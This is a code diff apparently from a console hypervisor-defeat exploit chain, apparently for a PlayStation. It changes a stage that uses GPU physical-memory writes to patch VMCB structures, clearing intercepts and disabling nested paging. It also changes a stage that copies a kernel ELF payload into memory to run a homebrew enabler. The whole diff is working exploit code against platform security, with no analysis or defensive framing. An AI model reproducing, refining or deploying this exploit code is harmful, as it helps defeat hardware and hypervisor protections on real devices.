@@ -169,20 +169,34 @@ int stage3_patch_vmcbs(hv_defeat_ctx *ctx) {
         return -2;
     }
 
+    int cur = sceKernelGetCurrentCpu();
+    pin_to_core(cur);
+
     for (int i = 0; i < ctx->vmcb_count; i++) {
-        int ret = pin_to_core(i);
 
         uint64_t pa = ctx->vmcb_pas[i];
-        uint32_t g1 = gpu_read_phys4(pa + VMCB_INTERCEPT_MISC);
-        uint32_t g2 = gpu_read_phys4(pa + VMCB_INTERCEPT_VMXX);
+        //uint32_t g1 = gpu_read_phys4(pa + VMCB_INTERCEPT_MISC);
+        //uint32_t g2 = gpu_read_phys4(pa + VMCB_INTERCEPT_VMXX);
 
+        gpu_write_phys4(pa + VMCB_NP_ENABLE, 0 );
         gpu_write_phys4(pa + VMCB_INTERCEPT_CR, 0);
-        gpu_write_phys4(pa + VMCB_INTERCEPT_EXC, 0);
-        gpu_write_phys4(pa + VMCB_INTERCEPT_MISC, g1 & (1u << 18));
-        gpu_write_phys4(pa + VMCB_INTERCEPT_VMXX, g2 & 0xF);
-        gpu_write_phys4(pa + VMCB_NP_ENABLE, 0);
-        std::print("  vmcb[{:2d}] patched{}\n", i, ret ? " (pin failed)" : "");
+        gpu_write_phys4(pa + VMCB_INTERCEPT_EXC, 0); // exception bitmap cleared
+        gpu_write_phys4(pa + VMCB_INTERCEPT_MISC, (1u << 18));  // keep CPUID
+        gpu_write_phys4(pa + VMCB_INTERCEPT_VMXX, 0xF);         // 0xF not 0x3
+        gpu_write_phys4(pa + VMCB_TLB_CONTROL, 1);                          
+        gpu_write_phys4(pa + VMCB_VMCB_CLEAN, 0);                          
+
+        usleep(1000); 
+        std::print("  vmcb[{:2d}] patched\n", i);
     }
+
+    for (int i = 0; i < 16; i++) {
+        if (pin_to_core(i) == 0) {
+            usleep(1000);
+            getpid();
+        }
+    }
+    usleep(200000);
     unpin();
 
     ctx->vmcbs_patched = 1;
@@ -411,6 +425,8 @@ int stage7_run_hen(hv_defeat_ctx *ctx) {
         uint32_t chunk = (i + 0x1000 <= sz) ? 0x1000 : (uint32_t)(sz - i);
         gpu_write_phys(dest_pa + i, &KELF[i], chunk);
     }
+
+    usleep(100000);
 
     std::print("  copied {} bytes to 0x{:x}\n", sz, dest);
 
